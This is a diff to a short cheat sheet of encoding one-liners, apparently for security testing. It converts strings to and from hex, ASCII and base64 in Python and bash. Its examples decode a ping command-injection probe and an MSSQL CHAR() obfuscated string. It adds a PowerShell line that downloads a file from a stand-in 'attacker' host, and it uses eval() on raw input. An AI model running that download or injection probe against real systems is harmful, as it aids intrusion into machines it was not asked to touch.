@@ -1,18 +1,29 @@
-# str to hex
+# python - str to hex
 print(*[hex(ord(i))[2:] for i in input('str:')], sep='')
 
-# str to ascii
+# bash - str to hex
+# result : 616263
+echo -n "abc" | xxd -p
+
+# python - str to ascii
 print(*[ord(i) for i in input('str:')], sep='')
 
-# str to base64
+# python - str to base64
 base64.b64encode('string'.encode()).decode()
 
-# hex to str
+# python - hex to str
 # input: 0x70696e67202d6e203230203132372e302e302e31
 # output: ping -n 20 127.0.0.1
 print(f"output: {bytearray.fromhex(input('input: ')[2:]).decode()}")
 
-# mssql - ascii to str
+# bash - hex to str
+# result : abc
+echo -n "616263" | xxd -p -r
+
+# python - mssql - ascii to str
 # input: CHAR(69)+CHAR(114)+CHAR(114)+CHAR(111)+CHAR(114)+CHAR(76)+CHAR(111)+CHAR(103)+CHAR(70)+CHAR(105)+CHAR(108)+CHAR(101)+CHAR(78)+CHAR(97)+CHAR(109)+CHAR(101)
 # output: ErrorLogFileName
 print(eval(input("input:").replace('CHAR','chr')))
+
+# win7 curl
+powershell "$client=New-Object System.Net.WebClient;$c=$client.DownloadString('http://attacker/xxx.txt');write-host -NoNewline $c"
